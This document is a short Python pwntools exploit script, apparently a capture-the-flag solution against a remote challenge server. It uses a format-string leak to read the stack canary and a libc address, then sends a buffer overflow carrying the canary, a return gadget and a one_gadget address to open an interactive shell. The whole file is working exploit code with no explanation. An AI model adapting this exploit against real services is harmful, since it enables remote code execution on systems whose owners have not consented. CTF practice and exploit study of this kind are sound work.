#!/usr/bin/env python3

from pwn import *

p = remote("chall.nitdgplug.org", 30091)
libc = ELF("./libc.so.6")

padding = "A"*0x48
libc_idx = 27
canary_idx = 23

fmtstr = f"%{canary_idx}$p_%{libc_idx}$p"
p.sendlineafter("?\n", fmtstr)
canary = int(p.recvuntil("_")[:-1], 16)
base = int(p.recvline().decode().strip("\n"), 16) - (0x0000000000023fc0 + 243)

log.info(f"canary: {hex(canary)}")
log.info(f"libc: {hex(base)}")

payload = padding.encode()
payload += p64(canary)
payload += b"BBBBBBBB"
payload += p64(base + 0x0000000000022679)
payload += p64(base + 0xe3b31)

sleep(0.2)
p.sendline(payload)

p.interactive()
